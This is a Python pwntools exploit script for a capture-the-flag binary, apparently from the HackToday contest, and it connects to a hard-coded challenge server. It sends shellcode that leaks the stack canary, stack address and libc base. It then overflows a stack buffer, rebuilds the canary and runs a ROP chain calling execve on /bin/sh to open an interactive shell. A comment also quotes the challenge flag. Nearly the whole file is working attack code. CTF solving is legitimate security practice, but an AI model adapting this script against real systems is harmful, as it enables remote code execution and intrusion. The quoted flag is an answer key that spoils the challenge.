#!/usr/bin/python

from pwn import *

context.arch = 'amd64'

PATH = './chall'

GDBSCRIPT = '''
b *main+52
b *main+193
b *main+174
b *main+272
'''

HOST = '103.41.207.206'
PORT = 17011

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])

def exploit(r):
    shellcode = '''
        add rsp, 0x80

        mov rax, 1
        mov rdi, 1
        lea rsi, [rsp]
        mov rdx, 0x28
        syscall
    
        xor rax, rax
        mov rdi, 0
        lea rsi, [rip]
        sub rsi, 0x33
        mov rdx, 0x200
        syscall

        jmp rsi
    '''
    
    shellcode = asm(shellcode)
    r.recvline(0)

    pause()
    # debug(GDBSCRIPT)

    r.send(shellcode)
    
    leaks = []
    for _ in range(5):
        leaks.append(u64(r.recv(8)))

    elf.address  = leaks[0] - 0x11e0
    stack        = leaks[1]
    canary       = leaks[2]
    libc.address = leaks[4] - libc.sym['__libc_start_main'] - 243
    
    info(hex(stack))
    info(hex(elf.address))
    info(hex(libc.address))
    info(hex(canary))
    
    shellcode = '''
        mov rax, 0
        mov rdi, 0
        add rsi, 0x400
        mov rdx, 0x500
        syscall

        mov rax, 1
        mov rdi, 4
        mov rdx, 0x100
        syscall
    '''
    
    # infinite loop | needed in local
    shellcode += '''
        jmp $
    '''
    
    # hacktoday{only_read_and_write_cant_stop_you__YXphCg}
    r.send(asm(shellcode))

    str_bin_sh = libc.address + 0x1b75aa

    rop = ROP(libc)
    rop.call(libc.sym['execve'], [str_bin_sh, 0, 0])
    
    pause()

    payload  = b'A' * 0x68 
    payload += p64(canary) * 2
    payload += p64(elf.address + 0x1564) # ret
    payload += bytes(rop)

    r.send(payload)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', 0)


    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        env = {'LD_PRELOAD' : './kill_alarm.so ./libc.so.6'}
        r = process(PATH, aslr=1, env=env)
    
    info(f'Debug child process command:\n$ sudo gdb-peda -p {r.pid + 1}')
    exploit(r)